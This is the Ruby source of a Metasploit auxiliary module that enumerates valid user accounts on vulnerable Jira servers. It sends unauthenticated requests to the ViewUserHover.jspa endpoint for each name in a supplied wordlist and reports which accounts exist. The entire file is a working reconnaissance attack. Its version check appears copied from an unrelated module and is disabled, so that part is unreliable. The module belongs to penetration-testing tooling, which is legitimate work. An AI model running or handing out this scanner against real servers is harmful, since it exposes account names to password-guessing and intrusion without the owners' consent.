##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient


  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Jira Users Enumeration',
      'Description'    => %q{
        This module exploits an information disclosure vulnerability that allows an 
        unauthenticated user to enumerate users in the /ViewUserHover.jspa endpoint.
        This only affects Jira versions < 7.13.16, 8.0.0 ≤ version < 8.5.7, 8.6.0 ≤ version < 8.12.0
        Discovered by Mikhail Klyuchnikov @__mn1__
      },
      'Author'         => [ 'Brian Halbach' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['URL', 'https://jira.atlassian.com/browse/JRASERVER-71560'],
        ],
      'DisclosureDate' => '2020-08-16'

    ))
    register_options(
      [
        #Opt::RPORT(443),
        #Opt::SSL(true),
        OptString.new('TARGETURI', [true, "Jira Path", "/"]),
        OptString.new('USERNAME', [ false, "Single username to test"]),
        OptPath.new('USER_FILE',
                    [false, 'File containing usernames, one per line'])
      ])
  end
  def base_uri
    @base_uri ||= normalize_uri("#{target_uri.path}/secure/ViewUserHover.jspa?username=")
  end

  def user_list
    users = []

    if datastore['USERNAME']
      users << datastore['USERNAME']
    elsif datastore['USER_FILE'] && File.readable?(datastore['USER_FILE'])
      users += File.read(datastore['USER_FILE']).split
    end

    users
  end

  def run_host(ip)
    # Main method
    #unless check_host(ip) == Exploit::CheckCode::Appears
    #  print_error("#{ip} does not appear to be vulnerable, will not continue")
    #  return
    #end

    users=user_list
    if users.empty?
      print_error('Please populate USERNAME or USER_FILE')
      return
    end

    print_status("Begin enumerating users at #{vhost}")
    print_status("Begin enumerating users at #{rhost}#{base_uri.to_s}")
    
    user_list.each do |user|
      print_status("checking user #{user}")
    res = send_request_cgi!(
        'uri'     => "#{base_uri}#{user}",
        'method'  => 'GET',
        'headers' => { 'Connection' => 'Close' }
      )
    #print_status(res.body) was manually reading the response while troubleshooting
    if res.body.include?('User does not exist')
      print_bad("'User #{user} does not exist'")
    elsif res.body.include?('<a id="avatar-full-name-link"')
      print_good("'User exists: #{user}'")
    else
      print_error("No response")
    end
  end

    
      

  end

  def check_host(ip)
    res = send_request_cgi(
      'uri'     => base_uri,
      'method'  => 'GET',
      'headers' => { 'Connection' => 'Close' }
    )

    unless res
      return Exploit::CheckCode::Unknown
    end
    if res.body.include?('Access denied')
      # This probably means the Views Module actually isn't installed
      print_error("Access denied")
      return Exploit::CheckCode::Safe
    elsif res.message != 'OK' || res.body != '[  ]'
      return Exploit::CheckCode::Safe
    else
      return Exploit::CheckCode::Appears
    end
  end

end
